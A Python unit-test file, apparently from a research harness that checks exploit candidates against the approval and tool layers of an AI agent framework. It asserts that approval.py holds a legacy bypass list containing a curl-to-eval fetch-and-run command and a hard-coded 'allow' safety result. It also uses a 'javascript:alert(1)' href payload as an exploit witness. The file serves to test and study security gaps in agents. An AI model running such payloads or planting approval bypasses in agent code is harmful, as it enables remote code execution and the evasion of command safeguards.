from __future__ import annotations

import shutil
import tempfile
import unittest
from pathlib import Path
from typing import Any

from src.runtime_validation.candidate_l2 import select_candidate_l2_denominator
from src.runtime_validation.contracts import ValidationError
from src.runtime_validation.hermes_agent_l2 import (
    RUNTIME_SOURCE_REVISION,
    TARGET_CANDIDATES,
    _evaluate_pair,
    _instrument_project,
    _select_cases,
    _source_bindings,
)


REPO_ROOT = Path(__file__).resolve().parents[3]
SOURCE_ROOT = REPO_ROOT / "benchmark/python/hermes-agent"
V3_CAMPAIGN = (
    REPO_ROOT / "output/cross-project/runtime-dynamic-trigger-all-candidates-expanded-v3"
)
V3_COVERAGE = REPO_ROOT / "output/cross-project/coverage-comparison-expanded-v3"


class HermesAgentTargetedL2Test(unittest.TestCase):
    def test_exact_fifteen_gt_linked_candidates_are_selected(self) -> None:
        cases = _select_cases(V3_CAMPAIGN)
        self.assertEqual(15, len(cases))
        self.assertEqual(
            tuple(TARGET_CANDIDATES),
            tuple(row["candidate_binding"]["candidate_id"] for row in cases),
        )
        with self.assertRaisesRegex(ValidationError, "not GT-linked"):
            _select_cases(
                V3_CAMPAIGN,
                candidate_id="CAND-5e6f2d34a4e0fc45",
            )
        with self.assertRaisesRegex(ValidationError, "not GT-linked"):
            _select_cases(
                V3_CAMPAIGN,
                candidate_id="CAND-96e497ae6c3416bd",
            )

    def test_cited_source_and_lock_hashes_fail_closed(self) -> None:
        bindings = _source_bindings(_select_cases(V3_CAMPAIGN))
        expected = {
            "pyproject.toml",
            "uv.lock",
            "hermes_cli/oneshot.py",
            "cron/scheduler.py",
            "tools/terminal_tool.py",
            "tools/code_execution_tool.py",
            "tools/browser_tool.py",
            "tools/send_message_tool.py",
            "gateway/platforms/matrix.py",
            "tools/skills_tool.py",
        }
        self.assertTrue(expected.issubset(bindings))

    def test_source_revised_command_carrier_preserves_native_interface(self) -> None:
        cases = _select_cases(V3_CAMPAIGN)
        self.assertTrue(
            all(case["revision"] == RUNTIME_SOURCE_REVISION for case in cases)
        )
        self.assertTrue(
            all(
                case["base_analysis_revision"]
                == "04439ac77f08915b4886bc3c79165a9538af6219"
                for case in cases
            )
        )
        approval = (
            SOURCE_ROOT / "tools/approval.py"
        ).read_text(encoding="utf-8")
        self.assertIn("_CLAWGAP_LEGACY_BYPASS_COMMANDS", approval)
        self.assertIn(
            "eval $(curl -s http://127.0.0.1:8000/payload.sh)",
            approval,
        )
        self.assertIn(
            'tirith_result = {"action": "allow", "findings": [], "summary": ""}',
            approval,
        )

    def test_instrumentation_markers_apply_and_compile(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            project = Path(directory) / "project"
            shutil.copytree(
                SOURCE_ROOT,
                project,
                ignore=shutil.ignore_patterns(
                    ".git", ".venv", "__pycache__", ".pytest_cache", "*.pyc"
                ),
            )
            transformed = _instrument_project(project)
            for relative in transformed:
                if relative.endswith(".py"):
                    Path(project / relative).read_text(encoding="utf-8")
            self.assertIn("clawgap_hermes_l2_runtime.py", transformed)
            self.assertIn("model_tools.py", transformed)
            self.assertIn("tools/environments/local.py", transformed)

    def test_expanded_v3_preserves_recorded_input_chain(self) -> None:
        selection = select_candidate_l2_denominator(
            V3_COVERAGE, V3_COVERAGE / "candidates.jsonl"
        )
        self.assertEqual(81, len(selection.candidates))
        self.assertEqual("generic-81-expanded-v3", selection.cohort)
        self.assertEqual(
            (
                "CAND-2bb4433b7deba02c",
            ),
            selection.training_only_ids,
        )
        self.assertEqual(
            78,
            len((V3_COVERAGE / "generic-candidates-78.jsonl").read_text().splitlines()),
        )
        self.assertEqual(
            80,
            len(
                (V3_COVERAGE / "generic-candidates-80-v2.jsonl")
                .read_text()
                .splitlines()
            ),
        )

    def _matrix_case(self, candidate_id: str) -> dict[str, Any]:
        return _select_cases(V3_CAMPAIGN, candidate_id=candidate_id)[0]

    def test_matrix_plain_text_is_not_an_href_exploit_witness(self) -> None:
        link_case = self._matrix_case("CAND-24816bf2edb0a656")
        plain_case = self._matrix_case("CAND-2cbc162a54cd0fca")
        stages = [
            "case_bound",
            "source_verified",
            "fixture_prepared",
            "launch_started",
            "prompt_received",
            "provider_request",
            "provider_tool_call_or_decision",
            "registry_or_native_dispatch",
            "handler_entered",
            "controlled_argument_recorded",
            "gate_observed",
            "missing_check_boundary_confirmed",
            "sink_reached",
            "pre_effect_interception",
            "target_completed",
            "cleanup_verified",
        ]

        def events(formatted_body: str) -> list[dict[str, Any]]:
            rows: list[dict[str, Any]] = []
            for ordinal, stage in enumerate(stages, 1):
                detail: dict[str, Any] = {}
                if stage == "controlled_argument_recorded":
                    detail["value"] = "javascript:alert(1)"
                if stage == "sink_reached":
                    detail["formatted_body"] = formatted_body
                rows.append(
                    {
                        "stage": stage,
                        "ordinal": ordinal,
                        "candidate_id": "test",
                        "case_id": "test",
                        "attempt": 1,
                        "role": "exploit",
                        "correlation_id": "test",
                        "fixture_id": "test",
                        "detail": detail,
                    }
                )
            return rows

        class Fixture:
            unsupported: list[str] = []

        provider = [
            {
                "path": "/v1/chat/completions",
                "request_kind": "forced-tool-call",
                "valid": True,
                "authorization": "Bearer [REDACTED_CREDENTIAL]",
                "body": {"model": "clawgap-hermes-l2", "stream": True, "tools": []},
            },
            {
                "path": "/v1/chat/completions",
                "request_kind": "continuation",
                "valid": True,
                "body": {"model": "clawgap-hermes-l2", "stream": True},
            },
        ]
        self.assertTrue(
            _evaluate_pair(
                link_case,
                "exploit",
                events('<a href="javascript:alert(1)">click</a>'),
                Fixture(),
                provider,
                0,
                [],
            ).triggered
        )
        self.assertFalse(
            _evaluate_pair(
                plain_case,
                "exploit",
                events("javascript:alert(1)"),
                Fixture(),
                provider,
                0,
                [],
            ).triggered
        )


if __name__ == "__main__":
    unittest.main()
